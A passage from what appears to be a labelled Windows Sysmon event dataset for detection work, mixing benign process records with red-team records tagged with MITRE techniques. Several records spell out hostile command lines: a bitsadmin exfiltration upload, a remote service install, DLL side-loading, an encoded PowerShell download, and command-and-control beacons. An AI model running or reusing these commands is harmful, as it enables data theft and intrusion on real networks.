  {"Timestamp":"2024-09-12T09:45:02.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0017}","Image":"C:\\Windows\\System32\\certutil.exe","SourceIp":"10.1.10.22","SourcePort":"53100","DestinationIp":"20.54.36.229","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam"},

  {"Timestamp":"2024-09-12T09:50:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0018}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\rundll32.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"rundll32.exe C:\\Users\\j.wang\\AppData\\Local\\Temp\\mscoree.dll,EntryPoint","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1218.011","AttackScenario":"DLL_SideLoad"},

  {"Timestamp":"2024-09-12T09:55:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0019}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\bitsadmin.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"bitsadmin /transfer exfil /upload /priority foreground https://cdn-update.azurewebsites.net/collect C:\\Users\\j.wang\\AppData\\Local\\Temp\\data.7z","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1048.003","AttackScenario":"Data_Exfiltration"},

  {"Timestamp":"2024-09-12T10:00:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0020}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\sc.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"sc \\\\WIN-SRV01 create UpdateSvc binPath= \"cmd.exe /c C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe\" start= auto","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1543.003","AttackScenario":"Remote_Service_Install"},

  {"Timestamp":"2024-09-12T10:00:05.300Z","EventID":7045,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-SRV01","HostIP":"10.1.10.30","ProcessGuid":"{srv01-0010}","UserName":"CORP\\j.wang","CommandLine":"cmd.exe /c C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1543.003"},

  {"Timestamp":"2024-09-12T10:05:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS03","HostIP":"10.1.10.23","ProcessGuid":"{ws03-0004}","ParentProcessGuid":"{ws03-0001}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\l.zhang\\Documents\\Budget_2025.xlsx\"","UserName":"CORP\\l.zhang","Label":"Benign"},

  {"Timestamp":"2024-09-12T10:10:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0021}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQBiAGEAY2BrAC4AYQB6ACIALAAiAEMAOgBcAHQAbQBwAFwAcAAuAGUAeABlACIAKQA=","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1059.001","AttackScenario":"Encoded_PS_Download"},

  {"Timestamp":"2024-09-12T10:15:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-DC01","HostIP":"10.1.10.10","ProcessGuid":"{dc01-0004}","ParentProcessGuid":"{dc01-0001}","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv","UserName":"NT AUTHORITY\\SYSTEM","Label":"Benign"},
  {"Timestamp":"2024-09-12T10:20:00.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0010}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Windows\\System32\\taskmgr.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"taskmgr.exe","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T10:25:00.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS03","HostIP":"10.1.10.23","ProcessGuid":"{ws03-0005}","ParentProcessGuid":"{ws03-0001}","Image":"C:\\Windows\\System32\\SnippingTool.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"SnippingTool.exe","UserName":"CORP\\l.zhang","Label":"Benign"},

  {"Timestamp":"2024-09-12T10:30:00.100Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0005}","Image":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","SourceIp":"10.1.10.22","SourcePort":"53200","DestinationIp":"20.54.36.229","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1071.001","AttackScenario":"C2_Beacon_Heartbeat"},
  {"Timestamp":"2024-09-12T10:31:00.200Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0005}","Image":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","SourceIp":"10.1.10.22","SourcePort":"53201","DestinationIp":"20.54.36.229","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1071.001","AttackScenario":"C2_Beacon_Heartbeat"},
  {"Timestamp":"2024-09-12T10:32:00.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0005}","Image":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","SourceIp":"10.1.10.22","SourcePort":"53202","DestinationIp":"20.54.36.229","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1071.001","AttackScenario":"C2_Beacon_Heartbeat"}
]
